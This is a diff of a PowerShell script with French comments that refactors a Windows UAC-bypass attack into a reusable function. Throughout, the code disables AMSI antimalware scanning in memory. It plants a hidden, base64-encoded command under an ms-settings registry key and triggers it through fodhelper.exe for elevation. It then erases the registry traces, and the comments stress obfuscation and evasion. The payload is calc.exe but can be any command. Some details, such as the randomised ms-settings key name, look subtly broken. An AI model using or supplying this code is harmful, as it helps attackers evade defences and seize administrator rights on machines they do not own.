@@ -1,49 +1,49 @@
-# Obfuscation complète : noms de variables aléatoires, encodage, désactivation des logs
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
-# Désactiver temporairement AMSI (en mémoire)
-try {
-    $Am = [Ref].Assembly.GetTypes()
-    ForEach ($A in $Am) {
-        if ($A.Name -match "Amsi") {
-            $Ami = $A.GetFields('NonPublic,Static')
-            ForEach ($F in $Ami) {
-                if ($F.Name -eq "amsiInitFailed") {
-                    $F.SetValue($null, $true)
+function Invoke-FodhelperBypass {
+    param(
+        [string]$Command = "calc.exe"
+    )
+
+    # Désactivation AMSI en mémoire
+    try {
+        $Zk9 = [Ref].Assembly.GetTypes()
+        ForEach ($Xj7 in $Zk9) {
+            if ($Xj7.Name -like "*iUtils") {
+                $Vn3 = $Xj7.GetFields('NonPublic,Static')
+                ForEach ($Qp5 in $Vn3) {
+                    if ($Qp5.Name -eq "amsiInitFailed") {
+                        $Qp5.SetValue($null, $true)
+                    }
                 }
             }
         }
+    } catch {}
+
+    # Génération aléatoire du nom de clé
+    $Bv2 = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
+    $Rg9 = "HKCU:\Software\Classes\ms-settings-$Bv2\Shell\Open\command"
+
+    # Encodage de la commande
+    $Ut8 = "Start-Process `"$Command`" -WindowStyle Hidden"
+    $Ky4 = [System.Text.Encoding]::Unicode.GetBytes($Ut8)
+    $Nf6 = [Convert]::ToBase64String($Ky4)
+    $Wp1 = "powershell -nop -w hidden -enc $Nf6"
+
+    try {
+        New-Item -Path $Rg9 -Force | Out-Null
+        New-ItemProperty -Path $Rg9 -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
+        Set-ItemProperty -Path $Rg9 -Name "(Default)" -Value $Wp1 -Force | Out-Null
+
+        Start-Process "fodhelper.exe" -WindowStyle Hidden -Verb RunAs | Out-Null
+        Start-Sleep -Milliseconds 2000
     }
-} catch {}
+    finally {
+        Remove-Item -Path "HKCU:\Software\Classes\ms-settings-$Bv2" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Variable -Name "Ut8","Ky4","Nf6","Wp1","Rg9","Bv2" -ErrorAction SilentlyContinue
+    }
+}
 
-# Générer un nom de clé COM aléatoire mais valide (ms-settings-*)
-$RandomName = -join ((97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
-$KeyPath = "HKCU:\Software\Classes\ms-settings-$RandomName\Shell\Open\command"
-
-# Commande à exécuter avec élévation (ex: calc)
-$Cmd = "Start-Process calc.exe -WindowStyle Hidden"
-
-# Encodage en Base64 (Unicode)
-$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Cmd)
-$EncodedCmd = [Convert]::ToBase64String($Bytes)
-
-# Construction de la payload
-$Payload = "powershell -nop -w hidden -enc $EncodedCmd"
-
-# Création discrète des clés de registre
-New-Item -Path $KeyPath -Force | Out-Null
-New-ItemProperty -Path $KeyPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
-Set-ItemProperty -Path $KeyPath -Name "(Default)" -Value $Payload -Type String -Force | Out-Null
-
-# Lancer fodhelper.exe de manière cachée
-Start-Process "fodhelper.exe" -WindowStyle Hidden -Verb RunAs -ErrorAction SilentlyContinue | Out-Null
-
-# Attente courte (éviter de tuer trop vite)
-Start-Sleep -Milliseconds 2500
-
-# Nettoyage complet du registre
-Remove-Item "HKCU:\Software\Classes\ms-settings-$RandomName" -Recurse -Force -ErrorAction SilentlyContinue
-
-# Réinitialisation rapide (optionnel)
-Remove-Variable -Name "Payload", "Cmd", "EncodedCmd", "Bytes", "KeyPath" -ErrorAction SilentlyContinue
+# Exemple d'utilisation
+Invoke-FodhelperBypass -Command "calc.exe"
